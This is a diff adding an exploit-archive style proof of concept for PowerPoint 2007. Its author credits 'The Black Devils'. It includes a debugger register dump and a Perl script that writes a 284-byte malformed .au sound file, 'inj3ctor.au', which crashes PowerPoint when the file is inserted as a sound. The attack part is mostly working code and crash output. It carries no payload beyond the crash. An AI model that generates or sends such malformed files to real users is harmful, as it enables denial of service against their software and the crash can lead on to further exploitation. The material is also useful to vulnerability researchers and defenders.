@@ -1,0 +1,97 @@
+# Title : Microsoft Office PowerPoint 2007  Crash PoC
+# Date: 2013-01-12
+# Software Link: http://office.microsoft.com/
+# Author: Asesino04
+# Tested on: Windows XP SP2
+ 
+# Special Thanks To : Ness Oum El Bouaghi
+ 
+ 
+# Bug Description:
+when you insert a sound to Microsoft office powerpoint 2007 ;the software will get crashed
+it tested on office 2007 ,all the versions  may be affected  too
+ 
+# Credit: This Bug was founded by Asesino04 "The Black Devils"
+
+
+# Proof Of Concept
+ 
+https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-prn1/601368_541967942509686_881180451_n.jpg
+ 
+ 
+/-->
+EAX FFFFFFFF
+ECX 00000000
+EDX 00000000
+EBX 0003DAD8
+ESP 0013BC5C
+EBP 0013BCF0
+ESI FFFFFFFF
+EDI 00199FF2
+EIP 0460E650 quartz.0460E650
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 1  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFDF000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+ST0 empty -??? FFFF 00FF00FF 00FF00FF
+ST1 empty -??? FFFF 00FF00FF 00FF00FF
+ST2 empty 0.0
+ST3 empty 0.0000721784745110199
+ST4 empty 2902527.2727272720080
+ST5 empty -0.0
+ST6 empty 41.943754053320141400
+ST7 empty 0.0
+               3 2 1 0      E S P U O Z D I
+FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+<--/
+ 
+#!/usr/bin/perl
+system("title The Black Devils");
+system("color 1e");
+system("cls");
+print "\n\n";               
+print "    |=======================================================|\n";
+print "    |= [!] Name : Microsoft Office PowerPoint 2007 ||.au   =|\n";
+print "    |= [!] Exploit :    Crash PoC                          =|\n";
+print "    |= [!] Author  :       Asesino04                       =|\n";
+print "    |= [!] Mail: mr.k4rizma(at)gmail(dot)com               =|\n";
+print "    |=======================================================|\n";
+sleep(2);
+print "\n";
+# Creating ...
+my $PoC =
+"\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01".
+"\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E".
+"\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22".
+"\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x66\x66\x66\x00";
+open(file , ">", "inj3ctor.au"); # Evil File au 284 Octets
+print file $PoC;
+print "\n [+] File successfully created!\n" or die print "\n [-] OupsS! File is Not Created !! ";
+close(file);
+ 
+
+-----------
+ Contact:
+# Youtube  : www.youtube.com/user/Th3BlackDevils
+# Facebook : www.facebook.com/DevilsDz
+# Email    : mr.k4rizma@gmail.com
